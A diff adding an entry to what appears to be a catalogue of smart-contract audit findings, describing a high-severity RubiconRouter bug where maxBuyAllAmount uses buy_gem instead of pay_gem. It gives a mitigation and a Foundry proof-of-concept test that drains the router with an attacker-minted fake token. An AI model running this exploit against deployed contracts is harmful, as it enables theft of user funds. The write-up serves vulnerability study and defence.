@@ -178,3 +178,60 @@ function addMintRequest(uint256 assetID, OrderInfo memory orderInfo) external wh
 ```
 
 </details>
+
+## 4.[High] An attacker can steal all RubiconRouter funds
+
+### Attacker steal funds
+
+- Summary: The vulnerability in **RubiconRouter** allows an attacker to steal all funds stored in the router due to a bug in the **maxBuyAllAmount** and **maxSellAllAmount** functions, where the token used for repayment is mistakenly set as **buy_gem** instead of **pay_gem**.
+
+- Impact & Recommendation: An attacker can exploit this by creating a fake token that only they can mint, approving it for market transactions, and then executing a trade that causes the router to send real assets (e.g., USDC) instead of the intended fake tokens. This results in the attacker stealing funds from the router. To mitigate this, the final transfers in these functions should use **pay_gem** instead of **buy_gem**.
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-04-rubicon#h-08-an-attacker-can-steal-all-rubiconrouter-funds) & [Report](https://code4rena.com/reports/2023-04-rubicon)
+
+<details><summary>POC</summary>
+
+```solidity
+
+  function test_WithRouter() public {
+    RubiconRouter router = new RubiconRouter();
+    router.startErUp(address(market), payable(address(WETH)));
+
+    address attacker = 0x000000000000000000000000000000000000dACa;
+    uint256 routerBalance = 1e10;
+    deal(address(TUSDC), address(router), routerBalance); // Set this to simulate current router balance
+    deal(address(TUSDC), attacker, 1+1);
+    vm.deal(attacker, 1 ether);
+
+
+    vm.startPrank(attacker);
+
+    // create fake coin which only attacker can mint
+    TokenWithFaucet FAKE = new TokenWithFaucet(attacker, "Fake", "FAKE", 18);
+    FAKE.adminMint();
+
+
+    FAKE.approve(address(market), type(uint256).max);
+    TUSDC.approve(address(market), type(uint256).max);
+    FAKE.approve(address(router), type(uint256).max);
+    TUSDC.approve(address(router), type(uint256).max);
+
+
+    // Create approval for fake coin (otherwise market will not be able to transfer fake coins from router)
+    router.offerWithETH{value: 1}(1 /* ETH */, 1, FAKE, 0, attacker);
+    router.buyAllAmountForETH(1, FAKE, 1);
+
+    // Assume TEST is a fake token only attacker can mint
+    uint256 fees = (routerBalance * (market.getFeeBPS() + market.makerFee())) / 100_000;
+    market.offer(1, TUSDC, routerBalance, FAKE, 0, attacker, attacker); // offer 1 usdc for a lot of fake coin
+
+    assertEq(TUSDC.balanceOf(attacker), 1);
+
+    FAKE.transfer(address(router), routerBalance + fees); // give router fake coins so it can buy the offer
+    router.maxBuyAllAmount(TUSDC, FAKE, type(uint256).max); // pay 1 usdc for a lot of usdc instead of fake coin (because of the vulnerability)
+
+    assertGt(TUSDC.balanceOf(attacker), 1);
+    console.log(TUSDC.balanceOf(attacker));
+
+```
+
+</details>
